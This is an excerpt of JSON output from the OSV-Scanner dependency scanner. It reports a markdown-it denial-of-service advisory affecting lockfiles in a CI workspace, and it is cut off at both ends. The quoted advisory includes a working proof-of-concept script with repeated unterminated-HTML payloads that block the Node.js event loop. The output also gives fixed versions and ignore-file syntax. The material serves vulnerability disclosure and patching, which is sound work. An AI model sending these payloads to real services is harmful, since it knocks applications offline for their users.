true`, including applications using the `commonmark` preset.\n\nOn Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\nSanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\nThe default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\nThe reported affected release is `15.0.2`; the full affected version range has not been established."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-111766](https://osv.dev/CVE-2026-111766)**.\n\n## [GHSA-vfgh-jcmw-g37q](https://osv.dev/GHSA-vfgh-jcmw-g37q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e With `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`\u003c!--`), processing instructions (`\u003c?`), declarations (`\u003c!A`), and CDATA sections (`\u003c![CDATA[`).\n\u003e \n\u003e An attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\u003e \n\u003e The issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\u003e \n\u003e ### Details\n\u003e \n\u003e `src/rules_inline/text.ts` treats `\u003c` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\u003e \n\u003e With HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\u003e \n\u003e ```js\n\u003e const match = state.src.slice(pos).match(HTML_TAG_RE)\n\u003e ```\n\u003e \n\u003e The comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `--\u003e`, `?\u003e`, `\u003e`, and `]]\u003e`.\n\u003e \n\u003e When the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\u003e \n\u003e The payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\u003e \n\u003e The existing `unclosed \u003c!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\u003e \n\u003e ```js\n\u003e '\u003c/' + '\u003c!--'.repeat(100000)\n\u003e ```\n\u003e \n\u003e However, it runs with default options, where HTML is disabled.\n\u003e \n\u003e A fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\u003e \n\u003e The original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\u003e \n\u003e ### Proof of concept\n\u003e \n\u003e Install the affected package in an empty directory:\n\u003e \n\u003e ```sh\n\u003e npm install markdown-it@15.0.2\n\u003e ```\n\u003e \n\u003e Save the following as `poc.mjs` and run `node poc.mjs`:\n\u003e \n\u003e ```js\n\u003e import MarkdownIt from 'markdown-it'\n\u003e import { performance } from 'node:perf_hooks'\n\u003e \n\u003e const mdHtml = new MarkdownIt({ html: true })\n\u003e const mdDefault = new MarkdownIt()\n\u003e const sizes = [8000, 16000, 32000, 64000]\n\u003e \n\u003e function measure(md, src) {\n\u003e   const start = performance.now()\n\u003e   md.render(src)\n\u003e   return (performance.now() - start).toFixed(1)\n\u003e }\n\u003e \n\u003e const variants = {\n\u003e   comment: '\u003c!--',\n\u003e   processing: '\u003c?x',\n\u003e   declaration: '\u003c!A',\n\u003e   cdata: '\u003c![CDATA['\n\u003e }\n\u003e \n\u003e for (const [name, opener] of Object.entries(variants)) {\n\u003e   console.log(`\\n${name}`)\n\u003e   for (const n of sizes) {\n\u003e     const src = 'x ' + opener.repeat(n)\n\u003e     console.log({\n\u003e       n,\n\u003e       bytes: Buffer.byteLength(src),\n\u003e       ms: measure(mdHtml, src)\n\u003e     })\n\u003e   }\n\u003e }\n\u003e \n\u003e const n = sizes.at(-1)\n\u003e const controls = {\n\u003e   'HTML disabled': [mdDefault, 'x ' + '\u003c!--'.repeat(n)],\n\u003e   'Closed comments': [mdHtml, 'x ' + '\u003c!----\u003e'.repeat(n)],\n\u003e   'HTML block': [mdHtml, '\u003c!--'.repeat(n)],\n\u003e   'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n\u003e }\n\u003e \n\u003e for (const [name, [md, src]] of Object.entries(controls)) {\n\u003e   console.log({ control: name, ms: measure(md, src) })\n\u003e }\n\u003e \n\u003e const repoPayload = '\u003c/' + '\u003c!--'.repeat(100000)\n\u003e console.log({\n\u003e   payload: 'Existing pathological test',\n\u003e   htmlFalseMs: measure(mdDefault, repoPayload),\n\u003e   htmlTrueMs: measure(mdHtml, repoPayload)\n\u003e })\n\u003e ```\n\u003e \n\u003e Measurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\u003e \n\u003e | Construct | 8,000 repetitions | 64,000 repetitions |\n\u003e | --- | ---: | ---: |\n\u003e | Comment | 170 ms | 8,799 ms |\n\u003e | Processing instruction | 26 ms | 1,566 ms |\n\u003e | Declaration | 93 ms | 5,628 ms |\n\u003e | CDATA | 119 ms | 4,179 ms |\n\u003e \n\u003e An eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.\n\u003e \n\u003e For the comment payload at 64,000 repetitions:\n\u003e \n\u003e - HTML disabled: 25 ms.\n\u003e - Closed comments: 29 ms.\n\u003e - Payload at the start of an HTML block: 1 ms.\n\u003e - Plain text: 1 ms.\n\u003e \n\u003e The existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\u003e \n\u003e Exact timings depend on the runtime and hardware.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is an availability issue affecting applications that render attacker-controlled Markdown with `html: true`, including applications using the `commonmark` preset.\n\u003e \n\u003e On Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\u003e \n\u003e Sanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\u003e \n\u003e The default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\u003e \n\u003e The reported affected release is `15.0.2`; the full affected version range has not been established.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | markdown-it | 14.3.0 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | markdown-it | 14.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-vfgh-jcmw-g37q | markdown-it | 14.3.3, 15.0.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111766\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111766\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-111766](https://osv.dev/CVE-2026-111766)**.\n\n## [GHSA-vfgh-jcmw-g37q](https://osv.dev/GHSA-vfgh-jcmw-g37q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e With `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`\u003c!--`), processing instructions (`\u003c?`), declarations (`\u003c!A`), and CDATA sections (`\u003c![CDATA[`).\n\u003e \n\u003e An attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\u003e \n\u003e The issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\u003e \n\u003e ### Details\n\u003e \n\u003e `src/rules_inline/text.ts` treats `\u003c` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\u003e \n\u003e With HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\u003e \n\u003e ```js\n\u003e const match = state.src.slice(pos).match(HTML_TAG_RE)\n\u003e ```\n\u003e \n\u003e The comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `--\u003e`, `?\u003e`, `\u003e`, and `]]\u003e`.\n\u003e \n\u003e When the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\u003e \n\u003e The payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a li